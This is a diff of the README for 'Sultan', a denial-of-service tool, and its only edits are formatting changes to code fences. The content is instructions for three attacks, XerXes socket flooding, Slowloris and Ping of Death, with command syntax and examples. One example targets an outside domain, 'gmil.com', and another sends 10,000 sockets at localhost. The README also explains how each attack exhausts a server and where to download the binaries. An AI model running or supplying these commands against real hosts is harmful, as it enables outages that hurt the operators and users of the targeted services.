@@ -9,7 +9,7 @@ Like this project? ![Say thanks!](https://img.shields.io/badge/Say%20Thanks-!-1E
 Sultan provides three attack methods as of v0.3.0: XerXes, SlowLoris, and DeathPing.
 
 Basic syntax:
-```
+```bash
 Usage: .\sultan slowloris [host] [port] [socket_count] [useSSL? (true|false)]
 Usage: .\sultan xerxes [host] [port] [connections] [threads]
 Usage: .\sultan deathping [host]
@@ -19,12 +19,12 @@ Usage: .\sultan deathping [host]
 Ths attack mimicks the so-called XerXes DOS code online - by creating hundreds or thousands of sockets on the target server and repeatedly sending a null character (`0x00`) to those sockets. Sultan can send approx. 1000 volleys/second, and more depending on how many threads and connections there are.
 
 #### Syntax 
-```
+```bash
 sultan xerxes "your_server" <port> <connections> <threads>
 ```
 
 For example, to attack the malware site `gmil.com` on port 80 with 8 connections and 4 threads, run the following:
-```
+```bash
 sultan xerxes "gmil.com" 80 8 4
 ```
 
@@ -38,23 +38,23 @@ This attack replicates the infamous Slowloris attack that took down numerous Ira
 It works by creating thousands of connections to the target server and keeping them alive for hours, or even days, occasionally sending `keep-alive` headers to prevent the victim from closing the connection.
 
 #### Syntax
-```
+```bash
 sultan slowloris "your_server" <port> <sockets> <ssl>
 ```
 
 For example, to attack yourself on port 80 with 10,000 sockets with SSL, try
-```
+```bash
 sultan slowloris localhost 80 10000 true
 ```
 If the SSL is not provided or is not a valid Boolean value, Sultan defaults to FALSE.
 
 ### Ping of Death
 #### Syntax
-```
+```bash
 sultan deathping <host>
 ```
 To attack a server called `ctepr`, try
-```
+```bash
 sultan deathping "ctepr"
 ```
 
@@ -62,7 +62,7 @@ sultan deathping "ctepr"
 Check the releases for the latest release, and download the appropriate `.zip` file for your platform. Then, add the `bin/Release/netcoreapp2.1/<platform>-<arch>/sultan(.exe)` file to your PATH.
 
 ## License
-- MIT License
+  - MIT License
 
 <br>
 
